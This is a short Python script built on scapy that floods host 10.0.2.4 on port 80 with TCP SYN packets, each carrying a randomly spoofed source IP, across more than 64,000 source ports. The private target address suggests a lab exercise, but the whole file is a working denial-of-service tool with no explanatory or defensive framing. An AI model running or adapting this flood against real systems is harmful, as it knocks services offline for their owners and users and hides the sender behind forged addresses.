#!/usr/bin/python
import sys
import random
from scapy.all import *

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def SYN_Flood():
    print(' ***   SENDING SYN PACKETS   *** \n')
    total = 0
    for s_port in range(1024,65535):
        IPLayer = IP(src=randomIP(), dst="10.0.2.4")
        TCPLayer = TCP(sport=s_port, dport=80, flags="S", window=random.randint(1000,9000))
        pkt = IPLayer/TCPLayer
        send(pkt,verbose=0)
        total+=1

    print("\nTotal packets sent: {}".format(total))

if __name__ == '__main__':
    SYN_Flood()
